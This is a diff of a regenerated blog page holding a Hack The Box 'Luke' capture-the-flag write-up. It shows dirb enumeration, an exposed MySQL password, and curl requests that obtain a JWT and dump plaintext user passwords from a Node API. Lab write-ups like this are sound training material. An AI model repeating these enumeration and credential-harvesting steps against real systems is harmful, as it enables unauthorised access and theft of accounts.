@@ -97,13 +97,13 @@
 
 
 
-<meta name="generator" content="Hugo 0.154.2">
+<meta name="generator" content="Hugo 0.162.0">
 
 
     
     
 
-<link type="text/css" rel="stylesheet" href="/css/bundle.min.2079d7b1d4c2ab5bcf5b79f133cf9778b6f5d2c4b6169ee745a2267ed4a29706.css">
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.b29560288abdb6366b230cde3c59285c98c1152dccc466ddf7135289406f621e.css">
 
 
     
@@ -283,6 +283,8 @@
                 
                         
                 
+                        
+                
             
         
         
@@ -303,6 +305,10 @@
                         </li>
                         
                             <li class="bullet">
+                                <a href="https://ryankozak.com/posts/cve-2026-7537/">MDJM Event Management &lt;= 1.7.8.3 - Authenticated (Administrator&#43;) Arbitrary File Upload via mdjm_email_upload_file Parameter</a>
+                            </li>
+                        
+                            <li class="bullet">
                                 <a href="https://ryankozak.com/posts/cve-2025-13374/">Kalrav AI Agent &lt;= 2.3.3 - Unauthenticated Arbitrary File Upload via kalrav_upload_file AJAX Action</a>
                             </li>
                         
@@ -318,10 +324,6 @@
                                 <a href="https://ryankozak.com/posts/cve-2025-12721/">g-FFL Cockpit &lt;= 1.7.1 - Missing Authorization to Unauthenticated Information Exposure</a>
                             </li>
                         
-                            <li class="bullet">
-                                <a href="https://ryankozak.com/posts/cve-2025-12189/">Bread &amp; Butter: Gate content &#43; Capture leads &#43; Collect first-party data &#43; Nurture with Ai agents &lt;= 7.10.1321 - Cross-Site Request Forgery to Arbitrary File Upload</a>
-                            </li>
-                        
                     
                 
             
@@ -330,6 +332,8 @@
                 
             
                 
+                
+                        
                 
                         
                 
@@ -465,7 +469,7 @@
       "url": "\/images\/d0n601.png"
     }
   },
-  "image": "null",
+  "image": "\"/images/ryan‑kozak.jpg\"",
   "mainEntityOfPage": {
     "@type": "WebPage",
     "@id": "https:\/\/ryankozak.com\/posts\/hack-the-box-luke-writeup\/"
@@ -561,7 +565,7 @@ Derry
 </code></pre><p>This doesn&rsquo;t give us a lot of information, but there are two usernames to add to our list, <strong>chihiro</strong> and <strong>derry</strong>.</p>
 <h3 id="port-80-apache">Port 80: Apache</h3>
 <p>Next, we run <strong>dirb</strong> in order to enumerate files and directories on the Apache server.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# dirb http://10.10.10.137 -X &#34;,.php,.txt&#34;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# dirb http://10.10.10.137 -X &#34;,.php,.txt&#34;
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
 </span></span></span><span style="display:flex;"><span>-----------------
 </span></span><span style="display:flex;"><span>DIRB v2.22    
@@ -608,10 +612,10 @@ Derry
 </span></span><span style="display:flex;"><span>END_TIME: Fri Jun 10 23:52:16 2019
 </span></span><span style="display:flex;"><span>DOWNLOADED: 13836 - FOUND: 5
 </span></span></code></pre></div><p>There is an exposed configuration file found <code>config.php</code>, which contains the <code>root</code> password for <code>MySQL</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$dbHost <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;localhost&#39;</span>; $dbUsername <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;root&#39;</span>; $dbPassword <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Zk6heYCyv6ZE9Xcg&#39;</span>; $db <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;login&#34;</span>; $conn <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">mysqli</span>($dbHost, $dbUsername, $dbPassword,$db) <span style="color:#66d9ef">or</span> <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Connect failed: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span> $conn <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">error</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$dbHost <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;localhost&#39;</span>; $dbUsername <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;root&#39;</span>; $dbPassword <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Zk6heYCyv6ZE9Xcg&#39;</span>; $db <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;login&#34;</span>; $conn <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">mysqli</span>($dbHost, $dbUsername, $dbPassword,$db) <span style="color:#66d9ef">or</span> <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Connect failed: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span> $conn <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">error</span>);
 </span></span></code></pre></div><h3 id="port-3000-nodejs">Port 3000: NodeJS</h3>
 <p>As we did with port <code>80</code>, we run <strong>dirb</strong> in order to enumerate directories. Since this appears to be an API returning JSON we&rsquo;re not including any file extensions in the scan.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# dirb http://10.10.10.137:3000 -w
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# dirb http://10.10.10.137:3000 -w
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
 </span></span></span><span style="display:flex;"><span>-----------------
 </span></span><span style="display:flex;"><span>DIRB v2.22    
@@ -643,66 +647,66 @@ Derry
 <h2 id="exploitation">Exploitation</h2>
 <p>Now we&rsquo;ve gathered all the information we can and it&rsquo;s time to begin our attack. So far we have collected four login pages and two potential user names. In order to increase our potential user count we add <code>root</code>, <code>admin</code>, and <code>administrator</code> to the list, as they&rsquo;re common on most systems. We will also try different capitalizations of the names if we fail to login to any of our entry points after exhausting the list.</p>
 <table>
-  <thead>
-      <tr>
-          <th><strong>Login Pages</strong></th>
-          <th><strong>Potential Users</strong></th>
-          <th><strong>Passwords</strong></th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td>http://10.10.10.137/login.php</td>
-          <td>admin</td>
-          <td>Zk6heYCyv6ZE9Xcg</td>
-      </tr>
-      <tr>
-          <td>http://10.10.10.137/management/</td>
-          <td>administrator</td>
-          <td></td>
-      </tr>
-      <tr>
-          <td>http://10.10.10.137:3000/login</td>
-          <td>chihiro</td>
-          <td></td>
-      </tr>
-      <tr>
-          <td>http://10.10.10.137:8000</td>
-          <td>derry</td>
-          <td></td>
-      </tr>
-      <tr>
-          <td></td>
-          <td>root</td>
-          <td></td>
-      </tr>
-  </tbody>
+	<thead>
+			<tr>
+					<th><strong>Login Pages</strong></th>
+					<th><strong>Potential Users</strong></th>
+					<th><strong>Passwords</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>http://10.10.10.137/login.php</td>
+					<td>admin</td>
+					<td>Zk6heYCyv6ZE9Xcg</td>
+			</tr>
+			<tr>
+					<td>http://10.10.10.137/management/</td>
+					<td>administrator</td>
+					<td></td>
+			</tr>
+			<tr>
+					<td>http://10.10.10.137:3000/login</td>
+					<td>chihiro</td>
+					<td></td>
+			</tr>
+			<tr>
+					<td>http://10.10.10.137:8000</td>
+					<td>derry</td>
+					<td></td>
+			</tr>
+			<tr>
+					<td></td>
+					<td>root</td>
+					<td></td>
+			</tr>
+	</tbody>
 </table>
 <p>Our first point to attack is port <code>8000</code>, as it&rsquo;s the most critical. After a bit of research the default credentials to Ajenti appear to be <code>root</code> for a username and <code>admin</code> for a password, but these do not work in this case. None of our potential users in combination with our MySQL password, authenticate us on Ajenti. Now we move on to the other services. After trying our list of potential users and password on port <code>8000</code> first, <code>/login.php</code> second, and <code>/management</code> third, we&rsquo;ve not succeeded to login to any of them.</p>
 <p>Port <code>3000</code> requires we craft some headers properly in order to attempt to authenticate, and out of laziness it&rsquo;s the last on the list of login pages to try our credentials on.</p>
 <h3 id="json-web-tokens">JSON Web Tokens</h3>
 <p>When we attempt to visit port <code>3000</code> we&rsquo;re given the following response indicating we&rsquo;re not authenticated.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JSON" data-lang="JSON"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;success&#34;</span>:<span style="color:#66d9ef">false</span>,<span style="color:#f92672">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;Auth token is not supplied&#34;</span>}
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-JSON" data-lang="JSON"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;success&#34;</span>:<span style="color:#66d9ef">false</span>,<span style="color:#f92672">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;Auth token is not supplied&#34;</span>}
 </span></span></code></pre></div><p>When we sent a GET request to the the <code>/login</code> endpoint we&rsquo;re returned text asking us to authenticate.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# curl http://10.10.10.137:3000/login
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# curl http://10.10.10.137:3000/login
 </span></span><span style="display:flex;"><span>&#34;please auth&#34;
 </span></span></code></pre></div><p>If we try and emulate a form, we see that the <code>/login</code> endpoint returns us <code>bad request</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# curl -F &#34;username=root&#34; -F &#34;password=Zk6heYCyvZk6heYCyv6ZE9Xcg&#34; -X POST http://10.10.10.137:3000/login
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# curl -F &#34;username=root&#34; -F &#34;password=Zk6heYCyvZk6heYCyv6ZE9Xcg&#34; -X POST http://10.10.10.137:3000/login
 </span></span><span style="display:flex;"><span>Bad Request
 </span></span></code></pre></div><p>Some <a href="https://medium.com/hyphe/token-based-authentication-in-node-6e8731bfd7f2" target="_blank">brief research</a> on NodeJS and JSON tokens shows us how to craft the proper header. Now, we&rsquo;re getting a <code>forbidden</code> response. This seems like our query is correct now, but our credentials are not.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# curl -s -X POST -H &#39;Accept: application/json&#39; -H &#39;Content-Type: application/json&#39; --data &#39;{&#34;username&#34;:&#34;root&#34;,&#34;password&#34;:&#34;Zk6heYCyv6ZE9Xcg&#34;,&#34;rememberMe&#34;:true}&#39; http://10.10.10.137:3000/login
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# curl -s -X POST -H &#39;Accept: application/json&#39; -H &#39;Content-Type: application/json&#39; --data &#39;{&#34;username&#34;:&#34;root&#34;,&#34;password&#34;:&#34;Zk6heYCyv6ZE9Xcg&#34;,&#34;rememberMe&#34;:true}&#39; http://10.10.10.137:3000/login
 </span></span><span style="display:flex;"><span>Forbidden
 </span></span></code></pre></div><p>Intuition was key to success here, as the username <code>admin</code> appears to also use the MySQL root password we&rsquo;ve previously found. Had we not added this to our list of usernames, we&rsquo;d have been dead in the water. We see below that we&rsquo;re given the JWT to authenticate us on port <code>3000</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# curl -s -X POST -H &#39;Accept: application/json&#39; -H &#39;Content-Type: application/json&#39; --data &#39;{&#34;username&#34;:&#34;admin&#34;,&#34;password&#34;:&#34;Zk6heYCyv6ZE9Xcg&#34;,&#34;rememberMe&#34;:true}&#39; http://10.10.10.137:3000/login
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# curl -s -X POST -H &#39;Accept: application/json&#39; -H &#39;Content-Type: application/json&#39; --data &#39;{&#34;username&#34;:&#34;admin&#34;,&#34;password&#34;:&#34;Zk6heYCyv6ZE9Xcg&#34;,&#34;rememberMe&#34;:true}&#39; http://10.10.10.137:3000/login
 </span></span><span style="display:flex;"><span>{&#34;success&#34;:true,&#34;message&#34;:&#34;Authentication successful!&#34;,&#34;token&#34;:&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYwNjQ4MDYwLCJleHAiOjE1NjA3MzQ0NjB9.mnXdriQeks-RRVtUmC5BnNl-P_HWWXhsb9fVQdJLmLI&#34;}r
 </span></span></code></pre></div><p>Lets use this token to get more info if we can. After a little playing around with the request headers we&rsquo;re able to authenticate into the <code>/users</code> directory, which returns a list of usernames.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# curl -H &#39;Accept: application/json&#39; -H &#34;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYwNjQ4MDYwLCJleHAiOjE1NjA3MzQ0NjB9.mnXdriQeks-RRVtUmC5BnNl-P_HWWXhsb9fVQdJLmLI&#34; http://10.10.10.137:3000/users
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# curl -H &#39;Accept: application/json&#39; -H &#34;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYwNjQ4MDYwLCJleHAiOjE1NjA3MzQ0NjB9.mnXdriQeks-RRVtUmC5BnNl-P_HWWXhsb9fVQdJLmLI&#34; http://10.10.10.137:3000/users
 </span></span><span style="display:flex;"><span>[{&#34;ID&#34;:&#34;1&#34;,&#34;name&#34;:&#34;Admin&#34;,&#34;Role&#34;:&#34;Superuser&#34;},{&#34;ID&#34;:&#34;2&#34;,&#34;name&#34;:&#34;Derry&#34;,&#34;Role&#34;:&#34;Web Admin&#34;},{&#34;ID&#34;:&#34;3&#34;,&#34;name&#34;:&#34;Yuri&#34;,&#34;Role&#34;:&#34;Beta Tester&#34;},{&#34;ID&#34;:&#34;4&#34;,&#34;name&#34;:&#34;Dory&#34;,&#34;Role&#34;:&#34;Supporter&#34;}]
 </span></span></code></pre></div><p>We also know that theres an endpoint <code>/users/admin</code>, and when we visit that we&rsquo;re given some credentials in plain text!</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# curl -H &#39;Accept: application/json&#39; -H &#34;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYwNjQ4MDYwLCJleHAiOjE1NjA3MzQ0NjB9.mnXdriQeks-RRVtUmC5BnNl-P_HWWXhsb9fVQdJLmLI&#34; http://10.10.10.137:3000/users/admin
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# curl -H &#39;Accept: application/json&#39; -H &#34;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYwNjQ4MDYwLCJleHAiOjE1NjA3MzQ0NjB9.mnXdriQeks-RRVtUmC5BnNl-P_HWWXhsb9fVQdJLmLI&#34; http://10.10.10.137:3000/users/admin
 </span></span><span style="display:flex;"><span>{&#34;name&#34;:&#34;Admin&#34;,&#34;password&#34;:&#34;WX5b7)&gt;/rp$U)FW&#34;}
 </span></span></code></pre></div><p>The admin password above doesn&rsquo;t work on any of our login pages either, not in combination with any of our current usernames. So, after some head scratching there&rsquo;s more CTF intuition required. Perhaps other users on the site have their own API endpoints?</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# curl -H &#39;Accept: application/json&#39; -H &#34;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYwNjQ4MDYwLCJleHAiOjE1NjA3MzQ0NjB9.mnXdriQeks-RRVtUmC5BnNl-P_HWWXhsb9fVQdJLmLI&#34; http://10.10.10.137:3000/users/derry
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# curl -H &#39;Accept: application/json&#39; -H &#34;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYwNjQ4MDYwLCJleHAiOjE1NjA3MzQ0NjB9.mnXdriQeks-RRVtUmC5BnNl-P_HWWXhsb9fVQdJLmLI&#34; http://10.10.10.137:3000/users/derry
 </span></span><span style="display:flex;"><span>{&#34;name&#34;:&#34;Derry&#34;,&#34;password&#34;:&#34;rZ86wwLvx7jUxtch&#34;}
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
 </span></span></span><span style="display:flex;"><span>root@kali:/media/sf_Research# curl -H &#39;Accept: application/json&#39; -H &#34;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYwNjQ4MDYwLCJleHAiOjE1NjA3MzQ0NjB9.mnXdriQeks-RRVtUmC5BnNl-P_HWWXhsb9fVQdJLmLI&#34; http://10.10.10.137:3000/users/yuri
@@ -712,30 +716,30 @@ Derry
 </span></span><span style="display:flex;"><span>{&#34;name&#34;:&#34;Dory&#34;,&#34;password&#34;:&#34;5y:!xa=ybfe)/QD&#34;}
 </span></span></code></pre></div><p>This is great, we&rsquo;ve expanded on our list of usernames a little, and our list of credentials significantly. Lets recap what we have so far before we move on to try them out on the other login pages.</p>
 <table>
-  <thead>
-      <tr>
-          <th><strong>Potential Users</strong></th>
-          <th><strong>Potential Passwords</strong></th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td>admin</td>
-          <td>WX5b7)&gt;/rp$U)FW</td>
-      </tr>
-      <tr>
-          <td>derry</td>
-          <td>rZ86wwLvx7jUxtch</td>
-      </tr>
-      <tr>
-          <td>dory</td>
-          <td>5y:!xa=ybfe)/QD</td>
-      </tr>
-      <tr>
-          <td>yuri</td>
-          <td>bet@tester87</td>
-      </tr>
-  </tbody>
+	<thead>
+			<tr>
+					<th><strong>Potential Users</strong></th>
+					<th><strong>Potential Passwords</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>admin</td>
+					<td>WX5b7)&gt;/rp$U)FW</td>
+			</tr>
+			<tr>
+					<td>derry</td>
+					<td>rZ86wwLvx7jUxtch</td>
+			</tr>
+			<tr>
+					<td>dory</td>
+					<td>5y:!xa=ybfe)/QD</td>
+			</tr>
+			<tr>
+					<td>yuri</td>
+					<td>bet@tester87</td>
+			</tr>
+	</tbody>
 </table>
 <h3 id="management">Management</h3>
 <p>The credentials we have obtained are again tried out port <code>8000</code>, but none of them are getting us in. So, we move on to the <code>/management</code> directory of port <code>80</code>. Since derry is the administrator of the site (as determined by the letter we found) we try his first. They work when we capitalize the first letter of his username.</p>
